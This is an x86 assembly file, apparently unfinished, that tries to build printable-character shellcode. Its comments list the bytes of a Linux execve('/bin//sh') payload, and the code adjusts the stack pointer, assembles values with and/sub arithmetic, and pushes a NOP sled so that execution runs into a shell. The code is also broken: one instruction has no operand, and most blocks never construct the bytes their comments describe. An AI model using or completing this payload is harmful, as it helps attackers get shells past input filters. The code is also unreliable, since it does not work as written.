global _start
	_start:
		;========================
		; \x31
		; \xc9\x51\x68\x2f
		; \x2f\x73\x68\x68
		; \x2f\x62\x69\x6e
		; \x89\xe3\x6a\x0b
		; \x58\x99\xcd\x80
		;========================
		;  add esp, 1024
		;========================
		push esp
		pop eax
		; add eax, 1024 <==> sub eax, (2**32 - 1024)
        sub eax, 4d4d4d4dH
        sub eax, 4d4d4d4dH
        sub eax, 65656166H
		push eax
		pop esp
		;========================
		;  set $eax = shellcode[0:-4]
		; \x58\x99\xcd\x80
		;========================
		; set $eax = 0
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 0x41254130H
		sub eax 
		push eax
		
		;========================
		;  set $eax = shellcode[-8:-4]
		; \x89\xe3\x6a\x0b
		;========================
		and eax, 49494949H
		and eax, 30303030H

		push eax
		
		;========================
		;  set $eax = shellcode[-12:-8]
		; \x2f\x62\x69\x6e
		;========================
		and eax, 49494949H
		and eax, 30303030H

		push eax
		;========================
		;  set $eax = shellcode[-16:-12]
		; \x2f\x73\x68\x68
		;========================
		and eax, 49494949H
		and eax, 30303030H
		push eax
		
		;========================
		;  set $eax = shellcode[-20:-16]
		; \xc9\x51\x68\x2f
		;========================
		and eax, 49494949H
		and eax, 30303030H
		
		push eax
		;========================
		;  set $eax = shellcode[-21:-20]
		; \x00\x00\x00\x31
		;========================
		and eax, 49494949H
		and eax, 30303030H

		push eax
		;========================
		;  set $eax = \x90\x90\x90\x90 (nop)
		;========================
		and eax, 49494949H
		and eax, 30303030H

		push eax
		;========================
		; fill pad with nop ; then $eip = $esp
		; and the shellcode is going to be excute
		;========================
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
